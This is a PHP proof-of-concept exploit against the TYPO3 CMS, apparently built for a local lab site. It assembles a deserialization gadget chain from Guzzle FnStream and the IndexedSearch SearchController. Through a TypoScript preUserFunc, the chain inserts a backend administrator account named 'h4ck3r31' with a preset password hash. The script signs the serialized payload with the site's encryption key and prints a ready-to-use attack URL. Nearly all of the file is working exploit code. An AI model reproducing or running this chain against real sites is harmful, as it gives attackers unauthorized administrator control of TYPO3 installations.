<?php
namespace GuzzleHttp\Psr7
{
    class FnStream
    {
        public $_fn_close;
        function __construct($f)
        {
            $this->_fn_close = $f;
        }
    }
}

namespace TYPO3\CMS\Core\TypoScript
{
    class TypoScriptService {}
}

namespace TYPO3\CMS\IndexedSearch\Controller
{
    class SearchController
    {
        protected $typoScriptService;
        protected $settings = [
            'results' => [
                /**
                 * @see TypoScriptService::convertPlainArrayToTypoScriptArray
                 */
                'summaryCropSignifier' => [
                    '_typoScriptNodeValue' => '',
                ]
            ]
        ];

        public function initialize($searchData = []) {}
        public function __construct(array $payload)
        {
            $this->typoScriptService = new \TYPO3\CMS\Core\TypoScript\TypoScriptService();
            $this->settings['results']['summaryCropSignifier'] = $payload;
        }
    }
}

namespace {
    $encryptionKey = readline('Encryption Key: ');
    // $encryptionKey = 'f30230987c323b8f81a0ab9fe5b690fd0ba3fb8161f4027221a6b6aa4c50ce629049b7d30c3681f3a9e2031f1dc401e6';

    /*
     * openssl passwd -1 -salt 123456 password
     * => $1$123456$qqQvjw0PqIk7otmzNsUIN0
     */

    /*
        cObject = TEXT
        cObject {
            value = be_users
            preUserFunc = TYPO3\CMS\Extbase\Persistence\Generic\Storage\Typo3DbBackend->addRow
            preUserFunc {
                username = h4ck3r31
                password = $1$123456$qqQvjw0PqIk7otmzNsUIN0
                admin = 1
            }
        }
     */
    $attackTypoScript = [
        'cObject' => [
            '_typoScriptNodeValue' => 'TEXT',
            'value' => 'be_users',
            'preUserFunc' => [
                '_typoScriptNodeValue' => 'TYPO3\\CMS\\Extbase\\Persistence\\Generic\\Storage\\Typo3DbBackend->addRow',
                'username' => 'h4ck3r31',
                'password' => '$1$123456$qqQvjw0PqIk7otmzNsUIN0',
                'admin' => 1
            ],
        ],
    ];

    $trigger = new \TYPO3\CMS\IndexedSearch\Controller\SearchController($attackTypoScript);
    $caller = new \GuzzleHttp\Psr7\FnStream([$trigger, 'initialize']);

    echo 'Plain "x"' . PHP_EOL;
    echo hash_hmac('sha1', 'x', $encryptionKey) . PHP_EOL;

    echo '---' . PHP_EOL;

    echo 'Real payload (signed)' . PHP_EOL;
    $attack = serialize($caller);
    $signedAttack = $attack . hash_hmac('sha1', $attack, $encryptionKey);
    print_r($signedAttack  . PHP_EOL);

    echo '---' . PHP_EOL;

    echo 'Real payload (signed, encoded)' . PHP_EOL;
    print_r(rawurlencode($signedAttack) . PHP_EOL);

    echo '---' . PHP_EOL;

    echo 'Possible URI' . PHP_EOL;
    print_r('http://typo3v9-hack.ddev.site/index.php?id=38&no_cache=1&tx_form_formframework[__trustedProperties]=' . rawurlencode($signedAttack) . PHP_EOL);

    echo '---' . PHP_EOL;
}
